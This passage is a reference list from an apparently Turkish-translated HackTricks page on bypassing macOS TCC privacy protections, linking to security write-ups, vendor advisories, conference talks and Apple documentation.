- [4] [Where in the World is Carmen Sandiego: macOS'ta Location Services'ı Kötüye Kullanma](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass, iCloud'dan veri çalıyor](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarization: hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [XCSSET malware'ında Zero-Day TCC bypass keşfedildi](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: "Mac'inizde Ne Olursa, Apple's iCloud'unda mı Kalır?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [Yeni macOS vulnerability'si, "powerdir," yetkisiz kullanıcı verisi erişimine yol açabilir](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Home directory'yi değiştirme ve TCC'yi bypass etme, diğer adıyla CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Müziği çalma ve TCC'yi bypass etme, diğer adıyla CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Bir (Fire)fox nasıl soyulur](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - macOS'ta Telegram ile TCC'yi Bypass Etme](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Apple Vulnerabilities'lerini Ortaya Çıkarma: diskarbitrationd ve storagekitd Audit Part 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - OS X'te environment variables ayarlama](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC bypass ve privilege escalation](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCC database'in üzerine mount ederek TCC bypass](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [macOS Privacy Mechanisms'ınızı Bypass Etmenin 20+ Yolu](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [TCC'ye Karşı Knockout Win - MacOS Privacy Mechanisms'ınızı Bypass Etmenin 20+ YENİ Yolu](https://www.youtube.com/watch?v=a9hsxPdRxsY)
{{#include ../../../../../banners/hacktricks-training.md}}
